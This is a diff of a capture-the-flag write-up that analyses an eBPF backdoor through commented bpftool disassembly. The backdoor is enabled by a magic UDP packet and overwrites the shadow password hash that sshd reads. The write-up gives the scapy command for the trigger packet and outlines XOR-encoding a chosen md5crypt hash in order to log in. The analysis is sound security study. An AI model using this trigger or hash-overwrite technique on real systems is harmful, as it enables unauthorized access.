@@ -387,7 +387,7 @@ int kprobe_netif_receive_skb(struct netif_receive_skb_args * args):
 ```
 
 ### Analysis of prog_id 16, Proven Hypothesis
-Checks done on each packet processed are
+Checks done on each processed packet are:
 - ip version = 4
 - ip header len = 20 bytes
 - ip protocol = 0x11 (udp)
@@ -398,164 +398,67 @@ Checks done on each packet processed are
 If all checks succeed, this is a **magic** packet to enable the backdoor and write an md5crypt hash into map_id 4. Value of this hash is taken from udp payload bytes 4-34, xor'd with 66 ('B').
 
 ### Deep Dive eBPF code for prog_id 17
-
-
-
-
-### Deep Dive eBPF code for prog_id 18
-
-
-
-
-int netif_receive_skb ( struct sk_buff * skb);
-
-
-
+The output of bpftool is shortened and commented for readability purposes.
 ```
-prog 17 writes to 
+root@egghunt:/sys/kernel/debug/tracing/events/net/netif_receive_skb# bpftool prog dump xlated id 17
+int getspnam_r_entry(long long unsigned int * ctx):
+   0: (bf) r3 = r1                               # src = *ctx
+  23: (bf) r1 = r10
+  24: (07) r1 += -168                            # dst on stack
+  25: (b7) r2 = 168                              # len = 168 bytes
+  26: (85) call bpf_probe_read_compat#-54752     # read 168 bytes from *ctx
+
+  27: (55) if r0 != 0x0 goto pc+12               # exit on failed read
+
+  28: (85) call bpf_get_current_pid_tgid#119360
+  29: (7b) *(u64 *)(r10 -176) = r0               # write pid_tgid to stack r10 - 176
+                            
   36: (18) r1 = map[id:3]
   38: (b7) r4 = 0
-  39: (85) call htab_map_update_elem#134224
-```
-progs 17/18 with getspnam_r read from maps 3,4 and writes with call bpf_probe_write_user (maybe into ssh process or somewhere else)
-
-```
-prog 16 checks magic packet and writes map 4
-I think they might manipulate the hash
-after xoring stuff
-```
- 194: (18) r1 = map[id:4][0]+0
- 196: (79) r2 = *(u64 *)(r10 -272)
- 197: (bf) r3 = r2
- 198: (77) r3 >>= 56
- 199: (73) *(u8 *)(r1 +32) = r3
- 200: (bf) r3 = r2
- 201: (77) r3 >>= 48
- 202: (73) *(u8 *)(r1 +31) = r3
-
-```
-root@egghunt:/tmp# bpftool prog dump xlated id 17
-int getspnam_r_entry(long long unsigned int * ctx):
-  26: (85) call bpf_probe_read_compat#-54752
-  28: (85) call bpf_get_current_pid_tgid#119360
-  36: (18) r1 = map[id:3]
-  39: (85) call htab_map_update_elem#134224
+  39: (85) call htab_map_update_elem#134224      # write shadow entry to map_id 3
+  
+  40: (b7) r0 = 0
+  41: (95) exit
 ```
 
+### Analysis of prog_id 17
+There doesn't seem to be much magic here. The shadow password hash from *ctx is likely to be written to map_id 3.
+
+### Deep Dive eBPF code for prog_id 18
+The output of bpftool is shortened a lot and commented for readability purposes.
 ```
-root@egghunt:/tmp# bpftool prog dump xlated id 18
 int getspnam_r_exit(long long unsigned int * ctx):
    0: (85) call bpf_get_current_pid_tgid#119360
+
    4: (18) r1 = map[id:3]
    6: (85) call __htab_map_lookup_elem#128720
-  17: (85) call bpf_probe_read_user#-60320
-  19: (18) r1 = map[id:4][0]+0
-  31: (85) call bpf_probe_write_user#-59968
+
+  17: (85) call bpf_probe_read_user#-60320              # likely reading to acquite dst pointer to target process
+                                                        # that was acquiring a user's shadow password hash via getspnam_r
+
+  19: (18) r1 = map[id:4][0]+0                          # map_id 4 offset 0, attribute enabled
+  21: (71) r1 = *(u8 *)(r1 +0)
+  22: (15) if r1 == 0x0 goto pc+11                      # exit if backdoor is not enabled
+
+  25: (18) r6 = map[id:4][0]+0
+  27: (18) r2 = map[id:4][0]+0
+  29: (07) r2 += 1                                      # src = map_id 4 offset 1, attribute hash
+  30: (b7) r3 = 35                                      # len 35
+  31: (85) call bpf_probe_write_user#-59968             # write hash from map_id 4 to target process
+                                                        # likely resulting in overwriting the shadow password hash
+                                                        # read by target process from shadow file with hash from magic packet
+
   36: (18) r1 = map[id:3]
-  38: (85) call htab_map_delete_elem#134016
+  38: (85) call htab_map_delete_elem#134016             # clean up
+
+  39: (b7) r0 = 0
+  40: (95) exit
 ```
 
-prog 16:
-int kprobe_netif_receive_skb(struct netif_receive_skb_args * args):
-port 1337, xor, stuff, write map 3
+### Analysis of prog_id 18
+Not much code to stare at here, either. But this eBPF code likely overwrites the shadow password hash, that the target process acquired for a user (like sshd, for login purposes), with the hash value that was transferred via the magic packet.
 
-```
-root@egghunt:/tmp# bpftool prog dump xlated id 16
-int kprobe_netif_receive_skb(struct netif_receive_skb_args * args):
-  33: (79) r3 = *(u64 *)(r1 +8)                 # r1 = pointer to skb + 8
-  34: (bf) r6 = r10
-  35: (07) r6 += -256
-  36: (bf) r1 = r6
-  37: (b7) r2 = 224
-  38: (85) call bpf_probe_read_compat#-54752    # read 224 bytes from skb + 8
-  39: (69) r1 = *(u16 *)(r6 +180)
-  40: (79) r2 = *(u64 *)(r6 +192)
-  41: (bf) r6 = r2
-  42: (0f) r6 += r1
-  43: (15) if r2 == 0x0 goto pc+6               # ?
-  44: (bf) r1 = r10
-  45: (07) r1 += -24
-  46: (b7) r2 = 20
-  47: (bf) r3 = r6
-  48: (85) call bpf_probe_read_compat#-54752    # read 20 bytes (likely ip header?)
-  49: (55) if r0 != 0x0 goto pc+241             # exit on fail
-  50: (bf) r1 = r10
-  51: (07) r1 += -24
-  52: (71) r1 = *(u8 *)(r1 +0)
-  53: (57) r1 &= 240
-  54: (55) if r1 != 0x40 goto pc+236            # exit on ip version != 4 (ip[0] & 0xf0 != 0x40
-  55: (bf) r1 = r10
-  56: (07) r1 += -24
-  57: (71) r1 = *(u8 *)(r1 +9)                  # offset 9 into ip header = protocol
-  58: (55) if r1 != 0x11 goto pc+232            # exit if not udp
-  59: (bf) r1 = r10
-  60: (07) r1 += -24
-  61: (71) r1 = *(u8 *)(r1 +0)
-  62: (57) r1 &= 15
-  63: (55) if r1 != 0x5 goto pc+227             # exit if ip[0] & 0x0f != 5 (ip header len != 20)
-
-  64: (07) r6 += 20                             # set read pointer behind ip header
-  65: (bf) r1 = r10
-  66: (07) r1 += -32
-  67: (b7) r2 = 8
-  68: (bf) r3 = r6
-  69: (85) call bpf_probe_read_compat#-54752    # read 8 bytes of packet data (udp header)
-  70: (55) if r0 != 0x0 goto pc+220             # exit on fail
-  71: (bf) r1 = r10
-  72: (07) r1 += -32
-  73: (69) r1 = *(u16 *)(r1 +2)                 # udp header offset 2 -> dst port
-  74: (55) if r1 != 0x3905 goto pc+216          # 1337
-
-  75: (bf) r1 = r10
-  76: (07) r1 += -32
-  77: (69) r1 = *(u16 *)(r1 +4)                 # udp header offset 4 -> length
-  78: (55) if r1 != 0x2a00 goto pc+212          # 42
-
-  86: (bf) r1 = r10
-  87: (07) r1 += -296
-  88: (b7) r2 = 34
-  89: (bf) r3 = r6
-  90: (85) call bpf_probe_read_compat#-54752    # read 34 bytes of packet data
-
-  91: (71) r1 = *(u8 *)(r10 -296)
-  92: (55) if r1 != 0x66 goto pc+198            # first data char = f
-
-  93: (71) r1 = *(u8 *)(r10 -295)
-  94: (55) if r1 != 0x73 goto pc+196            # second char = s
-  95: (71) r1 = *(u8 *)(r10 -294)
-  96: (55) if r1 != 0x66 goto pc+194            # third char = f
-```
-the checked bytes are overwritten in stack
-
-so maybe the magic packet is just that
-udp dst port 1337, len 42, data starts with fsf (0x66 0x73 0x66)
-could try to fire that with scapy at the image
-see what happens to the map 4
-
-what is the definition of bpf_probe_read_compat anyways
-seems to have 3 params
-1: dstbuf, 2: len, 3: ?
-and struct skb (which is the context in r1 at the start)
-
-```
-#ifdef CONFIG_ARCH_HAS_NON_OVERLAPPING_ADDRESS_SPACEBPF_CALL_3(bpf_probe_read_compat, void *, dst, u32, size,      const void *, unsafe_ptr)
-(bearbeitet)
-
-static const struct bpf_func_proto bpf_probe_read_compat_proto = {
-        .func           = bpf_probe_read_compat,
-        .gpl_only       = true,
-        .ret_type       = RET_INTEGER,
-        .arg1_type      = ARG_PTR_TO_UNINIT_MEM,
-        .arg2_type      = ARG_CONST_SIZE_OR_ZERO,
-        .arg3_type      = ARG_ANYTHING,
-};
-```
-
-http://vger.kernel.org/~davem/skb.html
-
-checks are:
-ip version = 4, ip header len = 20 bytes, protocol = udp, dst port = 1337, udp len = 42, payload starts with fsf (0x66, 0x73, 0x66)
-
+## Crafting the Magic Packet
 ```
 sudo scapy
 >>> p = IP(dst="127.0.0.1")/UDP(dport=1337, len=42)/Raw("fsf"+31*"b")
@@ -571,38 +474,11 @@ Sent 1 packets.
 ```
 apt install python3-scapy
 ```
-$1$ is md5 (3 bytes)
-31 bytes, fits perfectly after fsf to use 34 bytes of udp data
 
-```
->>> packet = IP(dst="127.0.0.1")/UDP(dport=1337)/Raw("fsf"+31*"b")
->>> send(packet)
-.
-Sent 1 packets.
-```
-
-```
-root@egghunt:~# bpftool map dump id 4
-[{
-        "value": {
-            ".bss": [{
-                    "backdoor": {
-                        "enabled": true,
-                        "hash": "$1$                               "
-                    }
-                }
-            ]
-        }
-    }
-]
-```
 
 approach:
 I think that you can provide it with a hash
-After fsf
-The value is xor‘d with 66
-So pick an md5 hash of your choice (hex repr!), xor it with 66 and put into udp data after fsf
-And then login via ssh
+
 
 ```
 mkpasswd -m md5crypt
